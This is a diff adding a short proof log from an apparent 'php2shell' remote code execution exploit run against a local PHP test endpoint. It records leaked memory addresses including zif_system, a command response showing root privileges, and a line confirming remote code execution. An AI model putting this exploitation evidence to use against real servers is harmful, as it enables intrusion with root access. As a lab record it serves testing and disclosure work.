@@ -1,0 +1,10 @@
+REMOTE php2shell proof
+utc=2026-10-26T21:26:05.296648+00:00
+target=http://127.0.0.1:18083/ping.php
+profile=alpine
+sizes seed=305042 A1=1045243 B1=339678 A2=279369
+attempt=1 statuses=200/200/200/200/200/200
+main=0x7fe511000000 php=0x560f58800000 zif_system=0x560f58d0dd70
+response=uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+LOCAL_PHP2SHELL_RCE_PROOF uid=0 gid=0
+RESULT=REMOTE_RCE_CONFIRMED
